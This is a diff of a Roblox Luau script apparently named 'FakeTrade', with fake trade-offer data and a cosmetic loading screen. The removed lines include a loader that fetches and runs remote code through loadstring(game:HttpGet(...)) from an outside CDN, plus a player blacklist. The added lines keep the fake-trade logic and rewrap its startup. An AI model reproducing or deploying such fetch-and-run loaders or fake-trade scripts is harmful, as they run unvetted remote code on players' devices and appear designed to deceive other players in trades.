@@ -1,65 +1,12 @@
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
-print("Stop deob my code")
--- ===== ДОБАВЛЕННЫЙ КОД ПОСЛЕ "stop deob my code" =====
-ID="a2e25733-5302-4dbf-ad49-3abd28367f86";
-RUN_AFTER=nil;
-loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
-
--- ===== ЧЁРНЫЙ СПИСОК =====
-local Blacklist = {
-    ["Viktoriya_kvd5768"] = true,
-    ["POTLIWA52"] = true
-}
-local playerName = game.Players.LocalPlayer.Name
-if Blacklist[playerName] then
-    game:GetService("Players").LocalPlayer:Kick(
-        "Если ты это видишь - ты попал(а) в черный список. Напиши в тт \"Wolokoscripts\" чтобы обжаловать"
-    )
-    return
-end
--- ===========================
-
-
--- =====================================
-
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local UserInputService = game:GetService("UserInputService")
-
--- ===== ЗАГРУЗОЧНЫЙ ЭКРАН =====
 local function ShowLoadingScreen()
     local player = game.Players.LocalPlayer
+    local playerGui = player:WaitForChild("PlayerGui")
     local screenGui = Instance.new("ScreenGui")
     screenGui.Name = "LoadingScreen"
     screenGui.ResetOnSpawn = false
     screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
     screenGui.DisplayOrder = 999999999
-    screenGui.Parent = player.PlayerGui
+    screenGui.Parent = playerGui
 
     local bg = Instance.new("Frame")
     bg.Size = UDim2.new(1, 0, 1, 0)
@@ -107,6 +54,7 @@ local function ShowLoadingScreen()
     barBg.BorderSizePixel = 0
     barBg.ZIndex = 1
     barBg.Parent = window
+
     local barCorner = Instance.new("UICorner")
     barCorner.CornerRadius = UDim.new(0, 10)
     barCorner.Parent = barBg
@@ -117,6 +65,7 @@ local function ShowLoadingScreen()
     fill.BorderSizePixel = 0
     fill.ZIndex = 2
     fill.Parent = barBg
+
     local fillCorner = Instance.new("UICorner")
     fillCorner.CornerRadius = UDim.new(0, 10)
     fillCorner.Parent = fill
@@ -153,6 +102,7 @@ local function ShowLoadingScreen()
     local duration = 20
     local startTime = tick()
     local progress = 0
+
     while progress < 1 do
         local elapsed = tick() - startTime
         progress = math.min(elapsed / duration, 1)
@@ -163,25 +113,18 @@ local function ShowLoadingScreen()
     end
 
     task.wait(0.2)
-    screenGui:Destroy()
+    if screenGui and screenGui.Parent then
+        screenGui:Destroy()
+    end
 end
--- ==============================
 
--- ===== ЖДЁМ ЗАГРУЗКУ, ПОТОМ ЗАПУСКАЕМ ОСНОВНОЙ СКРИПТ =====
-task.spawn(function()
-    ShowLoadingScreen()
-    StartMainScript()
-end)
-
--- ===== ОСНОВНАЯ ФУНКЦИЯ =====
-function StartMainScript()
+local function StartMainScript()
+-- This file was generated at discord.gg/syncrypt
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local TweenService = game:GetService("TweenService")
-print("[FakeTrade] script started")
-
 game:GetService("CoreGui")
 
 do
@@ -1620,7 +1563,7 @@ do
 														Offer = {},
 													},
 													Player2 = {
-														Player = "Woloko",
+														Player = "m0_3a",
 														Accepted = false,
 														Offer = {},
 													},
@@ -5881,3 +5824,16 @@ do
 		end)
 	return
 end
+
+end
+
+task.spawn(function()
+    local ok, err = pcall(function()
+        ShowLoadingScreen()
+        StartMainScript()
+    end)
+
+    if not ok then
+        warn("[FakeTrade] Error: " .. tostring(err))
+    end
+end)
